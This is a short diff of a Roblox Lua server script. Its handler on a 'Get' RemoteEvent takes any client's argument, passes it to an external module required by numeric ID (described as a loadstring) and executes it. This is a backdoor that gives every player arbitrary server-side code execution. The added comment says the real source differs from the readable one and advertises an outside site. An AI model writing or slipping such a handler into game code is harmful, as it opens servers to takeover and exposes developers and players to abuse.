@@ -9,3 +9,12 @@ inst.Parent = game.ReplicatedStorage
 game.ReplicatedStorage.Get.OnServerEvent:Connect(function(plr, arg)
   require(11132601314)(arg, getfenv())() -- adonis loadstring, you can use your own loadstring if you want
 end)
+
+
+--[[
+
+NOTE: ORIGINAL SOURCE IS DIFFERENT THAN READABLE SOURCE BECAUSE OF HOW ROBLOX WORKS
+(argument can't be escaped using getfenv)
+meanwhile you are here check out https://axtrct.xyz
+
+]]--
